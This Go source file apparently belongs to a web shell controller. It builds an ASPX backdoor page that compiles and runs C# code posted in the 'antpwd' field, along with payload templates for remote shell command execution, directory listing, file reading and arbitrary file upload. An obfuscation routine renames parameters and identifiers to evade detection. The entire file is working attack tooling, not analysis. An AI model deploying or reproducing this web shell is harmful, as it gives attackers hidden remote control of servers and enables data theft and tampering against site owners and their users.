package aspx

import "strings"

type ASPXTemplates struct{}
func NewASPXTemplates() *ASPXTemplates { return &ASPXTemplates{} }

func pageWrap(code string) string {
	return "using System;using System.IO;using System.Text;using System.Diagnostics;" +
		"public class E{" +
		"static string d(string s){return Encoding.UTF8.GetString(Convert.FromBase64String(s));}" +
		"static string e(string s){return Convert.ToBase64String(Encoding.UTF8.GetBytes(s));}" +
		"public static void Run(){" + code + "}}"
}

func (t *ASPXTemplates) Info() string {
	return pageWrap(
		"string wd=Server.MapPath(\".\");string os=Environment.OSVersion.ToString();" +
		"string us=Environment.UserName;" +
		"Response.Write(e(wd)+\"\\t\"+e(os)+\"\\t\"+e(us));")
}

func (t *ASPXTemplates) Exec() string {
	return pageWrap(
		"string cmd=d(Request.Form[\"z1\"]);" +
		"string sh=Environment.OSVersion.Platform.ToString().Contains(\"Win\")?\"cmd.exe\":\"/bin/sh\";" +
		"string ar=sh.EndsWith(\"cmd\")?\"/c \":\"-c \";" +
		"Process p=Process.Start(new ProcessStartInfo(sh,ar+cmd){UseShellExecute=false,RedirectStandardOutput=true});" +
		"string o=p.StandardOutput.ReadToEnd();p.WaitForExit();" +
		"Response.Write(o+\"ret=\"+p.ExitCode);")
}

func (t *ASPXTemplates) FileList() string {
	return pageWrap(
		"string p=d(Request.Form[\"z1\"]);" +
		"foreach(string d in Directory.GetDirectories(p)){" +
		"DirectoryInfo di=new DirectoryInfo(d);" +
		"Response.Write(di.Name+\"/\\t\"+di.LastWriteTime.ToString(\"yyyy-MM-dd HH:mm:ss\")+\"\\t-1\\t0755\\n\");}" +
		"foreach(string f in Directory.GetFiles(p)){" +
		"FileInfo fi=new FileInfo(f);" +
		"Response.Write(fi.Name+\"\\t\"+fi.LastWriteTime.ToString(\"yyyy-MM-dd HH:mm:ss\")+\"\\t\"+fi.Length+\"\\t0644\\n\");}")
}

func (t *ASPXTemplates) FileRead() string {
	return pageWrap(
		"string p=d(Request.Form[\"z1\"]);" +
		"Response.Write(Convert.ToBase64String(File.ReadAllBytes(p)));")
}

func (t *ASPXTemplates) FileDownload() string { return t.FileRead() }

func (t *ASPXTemplates) FileUpload() string {
	return pageWrap(
		"string p=d(Request.Form[\"z1\"]);string c=d(Request.Form[\"z2\"]);" +
		"File.WriteAllText(p,c);Response.Write(\"1\");")
}

func ShellSourceWith(obf *Obfuscator) string {
	code := ShellSource()
	return templateSubst(code, obf)
}

func templateSubst(code string, obf *Obfuscator) string {
	out := code
	p1 := obf.Param1()
	p2 := obf.Param2()
	hd := obf.HelperDecode()
	he := obf.HelperEncode()
	cn := obf.ClassName()
	out = strings.ReplaceAll(out, `Request.Form["z1"]`, `Request.Form["`+p1+`"]`)
	out = strings.ReplaceAll(out, `Request.Form["z2"]`, `Request.Form["`+p2+`"]`)
	// Replace helper function names: d( -> hd(,  e( -> he(  (declarations and calls)
	out = strings.ReplaceAll(out, ` string d(`, ` string `+hd+`(`)
	out = strings.ReplaceAll(out, `Return `+`d(`, `Return `+hd+`(`)
	out = strings.ReplaceAll(out, ` string e(`, ` string `+he+`(`)
	out = strings.ReplaceAll(out, `Return `+`e(`, `Return `+he+`(`)
	// Replace class name: public class E{ and CreateInstance("E")
	out = strings.ReplaceAll(out, `class E{`, `class `+cn+`{`)
	out = strings.ReplaceAll(out, `"E"`, `"`+cn+`"`)
	return out
}

func ShellSource() string {
	return `<%@ Page Language="C#" AutoEventWireup="false" %>` + "\n" +
		`<%@ Import Namespace="System" %>` + "\n" +
		`<%@ Import Namespace="System.IO" %>` + "\n" +
		`<%@ Import Namespace="System.Text" %>` + "\n" +
		`<%@ Import Namespace="System.CodeDom.Compiler" %>` + "\n" +
		`<%@ Import Namespace="System.Reflection" %>` + "\n" +
		`<script runat="server">` + "\n" +
		`void Page_Load(){` + "\n" +
		`string enc=Request.Form["antpwd"];` + "\n" +
		`if(!string.IsNullOrEmpty(enc)){` + "\n" +
		`  try{` + "\n" +
		`    CodeDomProvider cp=CodeDomProvider.CreateProvider("CSharp");` + "\n" +
		`    CompilerParameters cmp=new CompilerParameters();` + "\n" +
		`    cmp.ReferencedAssemblies.Add("System.dll");` + "\n" +
		`    cmp.GenerateInMemory=true;` + "\n" +
		`    CompilerResults cr=cp.CompileAssemblyFromSource(cmp,enc);` + "\n" +
		`    if(cr.Errors.Count>0){` + "\n" +
		`      Response.Write("ERR:COMPILE:"+cr.Errors[0].ErrorText);` + "\n" +
		`    }else{` + "\n" +
		`      object o=cr.CompiledAssembly.CreateInstance("E");` + "\n" +
		`      if(o!=null){o.GetType().GetMethod("Run").Invoke(o,null);}` + "\n" +
		`    }` + "\n" +
		`  }catch(Exception ex){Response.Write("ERR:ASMX:"+ex.Message);}` + "\n" +
		`}}` + "\n" +
		`</script>`
}
